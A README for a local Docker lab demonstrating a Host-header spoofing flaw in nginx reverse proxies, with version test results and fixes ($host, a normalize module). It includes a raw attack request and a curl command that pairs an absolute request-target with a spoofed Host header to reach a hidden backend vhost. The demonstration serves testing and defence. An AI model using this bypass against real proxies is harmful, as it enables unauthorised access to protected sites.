# Host Header Spoofing Vulnerability Demo

This Docker Compose setup demonstrates the Host header spoofing vulnerability
when using absolute URIs with nginx reverse proxy.

## Architecture

```
                    ┌─────────────────┐
   Client ────────► │  Reverse Proxy  │ ─────► Backend
   (attacker)       │  (nginx:1.24)   │        (2 vhosts)
                    │                 │
                    │  Only exposes:  │        ├── public.local
                    │  public.local   │        └── protected.local
                    └─────────────────┘             (hidden)
```

## The Attack

The attacker sends:

```
GET http://public.local/ HTTP/1.1
Host: protected.local
```

The proxy routes to `public.local` (from request line) but passes
`Host: protected.local` to the backend, which serves the protected content.

## Usage

```bash
# Test with nginx 1.24 (vulnerable)
./test-vulnerability.sh 1.24

# Test with other versions
./test-vulnerability.sh 1.25
./test-vulnerability.sh 1.27
```

## Test Results

| nginx Version | Status         |
| ------------- | -------------- |
| 1.24          | **Vulnerable** |
| 1.27          | **Vulnerable** |
| 1.29.6        | **Vulnerable** |

**Conclusion:** The reverse proxy vulnerability is NOT fixed in any nginx version (tested up to 1.29.6).
Use `$host` instead of `$http_host`, or install ngx-http-host-normalize module.

## Manual Testing

```bash
# Start the environment
docker compose up -d

# Normal request (works)
curl -H 'Host: public.local' http://localhost:8888/

# Direct protected request (blocked by proxy)
curl -H 'Host: protected.local' http://localhost:8888/

# ATTACK: Absolute URI with spoofed Host
curl --request-target 'http://public.local/' \
     -H 'Host: protected.local' \
     http://localhost:8888/

# Cleanup
docker compose down
```

## Fix

Either:

1. Install ngx-http-host-normalize module
2. Use `$host` instead of `$http_host` in proxy_set_header
